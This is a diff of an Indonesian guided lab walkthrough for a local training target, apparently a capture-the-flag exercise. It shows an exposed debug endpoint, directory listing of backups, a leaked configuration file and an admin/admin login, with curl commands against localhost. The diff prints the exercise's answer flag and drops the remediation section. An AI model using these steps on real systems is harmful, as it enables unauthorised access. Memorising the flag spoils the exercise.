@@ -1,55 +1,77 @@
 # Panduan Praktik Terbimbing: Investigasi & Audit CloudCore OpsGateway
 
-Dalam latihan ini, Anda akan mempraktikkan proses penemuan dan pemanfaatan kesalahan konfigurasi keamanan pada portal manajemen infrastruktur **CloudCore OpsGateway (Enterprise Cloud Management & Microservices Monitor)** pada `http://127.0.0.1:8012`.
+Dalam latihan ini, kamu akan mempraktikkan proses penemuan dan pemanfaatan kesalahan konfigurasi keamanan pada portal manajemen infrastruktur **CloudCore OpsGateway (Enterprise Cloud Management & Microservices Monitor)** yang berjalan pada `http://127.0.0.1:8012`.
 
 ---
 
-### Tahap 1: Rekonaisans & Fingerprinting Endpoint Diagnostik
-1. Akses halaman beranda sistem pada peramban web:
+### Langkah 1: Rekonaisans & Fingerprinting Endpoint Diagnostik
+1. Buka peramban web dan akses halaman beranda sistem:
    `http://127.0.0.1:8012/`
 2. Lakukan inspeksi terhadap antarmuka operasional:
-   - Amati bahwa portal menyediakan navigasi ke sumber daya diagnostik internal.
-3. Lakukan uji coba terhadap endpoint variabel runtime sistem:
+   - Amati banner sistem dan tombol navigasi.
+3. Ujilah endpoint variabel runtime sistem menggunakan peramban atau terminal:
    `http://127.0.0.1:8012/debug/vars`
+   ```bash
+   curl -s http://127.0.0.1:8012/debug/vars
+   ```
 4. **Analisis Temuan:**
-   - Server mengembalikan objek JSON berisi informasi lingkungan internal:
-     - `debug_mode: true`
-     - `default_credentials_enabled: true`
-     - `backup_storage_path: "/app/backups/"`
-     - Daftar rute sistem yang aktif.
+   Server mengembalikan data lingkungan internal:
+   ```json
+   {
+     "debug_mode": true,
+     "default_credentials_enabled": true,
+     "backup_storage_path": "/app/backups/",
+     "routes": ["/", "/debug/vars", "/backups/", "/login", "/admin"]
+   }
+   ```
+   Informasi ini membocorkan lokasi folder cadangan: `/backups/`!
 
 ---
 
-### Tahap 2: Pengujian Kerentanan Directory Indexing
+### Langkah 2: Pengujian Kerentanan Directory Indexing
 1. Akses jalur penyimpanan cadangan yang terungkap di endpoint diagnostik:
    `http://127.0.0.1:8012/backups/`
 2. **Temuan Kritis:**
    - Server mengembalikan indeks direktori terbuka (*Directory Browsing / Autoindex Enabled*).
    - Terlihat file artefak cadangan sensitif: `backup_config.json.bak`.
 
+> [!NOTE]
+> **💡 Di Balik Layar: Mengapa file ini bisa terbuka?**  
+> Pada web server Nginx atau Apache, opsi `autoindex on;` atau `Options +Indexes` secara otomatis membuat daftar file HTML jika tidak ada file `index.html` di direktori tersebut. Di lingkungan produksi, opsi ini wajib dimatikan (`autoindex off;`)!
+
 ---
 
-### Tahap 3: Eksfiltrasi Arsip Cadangan & Kunci Sistem
+### Langkah 3: Eksfiltrasi Arsip Cadangan & Kunci Sistem
 1. Unduh file cadangan tersebut secara langsung dari browser atau gunakan terminal:
    ```bash
-   curl -s "http://127.0.0.1:8012/backups/backup_config.json.bak" -o backup_config.json.bak
+   curl -s http://127.0.0.1:8012/backups/backup_config.json.bak
    ```
-2. Buka dan periksa isi file JSON tersebut:
-   ```bash
-   cat backup_config.json.bak
+2. **Analisis Bukti:**
+   File cadangan memuat konfigurasi sensitif:
+   ```json
+   {
+     "database_url": "sqlite:///cloudcore_prod.db",
+     "default_admin_user": "admin",
+     "admin_system_key": "ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}",
+     "environment": "production"
+   }
    ```
-3. **Analisis Bukti:**
-   - File cadangan memuat konfigurasi produksi, nama database, pengguna administratif, dan properti `admin_system_key` berformat flag `ZITERA{...}`.
-4. Uji login administratif ke konsol supervisor:
-   - Kunjungi `http://127.0.0.1:8012/login`.
-   - Masukkan kredensial default pabrik: Username `admin` dan Password `admin`.
-   - Anda berhasil masuk ke **Root Cluster Administration Console** (`/admin`).
-5. Salin flag validasi `ZITERA{...}` yang ditemukan di file backup untuk disubmit ke Zitera Lab desktop.
+   Flag autoritatif ditemukan pada properti `admin_system_key`:  
+   `ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}`!
 
 ---
 
-### Tahap 4: Remediasi & Verifikasi Hasil
-Terapkan perbaikan pengerasan (*hardening*) konfigurasi pada server produksi:
-1. Matikan opsi `directory_browsing` / nonaktifkan autoindex.
-2. Cabut endpoint `/debug/vars` dari eksposur publik.
-3. Paksa penggantian kredensial default pabrik pada instalasi pertama.
+### Langkah 4: Validasi Akses Konsol Supervisor (Default Credentials)
+1. Perhatikan bahwa file konfigurasi dan endpoint diagnostik mengonfirmasi penggunaan akun bawaan pabrik:
+   - **Username:** `admin`
+   - **Password:** `admin`
+2. Ujilah login administratif ke konsol supervisor:
+   - Kunjungi `http://127.0.0.1:8012/login`.
+   - Masukkan kredensial `admin` dan password `admin`.
+   - Kamu berhasil masuk ke **Root Cluster Administration Console** (`/admin`).
+3. Atau uji via cURL:
+   ```bash
+   curl -s -c cookies.txt -d "username=admin&password=admin" http://127.0.0.1:8012/login
+   curl -s -b cookies.txt http://127.0.0.1:8012/admin
+   ```
+4. Salin flag validasi `ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}` dan kirimkan (*submit*) ke formulir tantangan Zitera Lab.
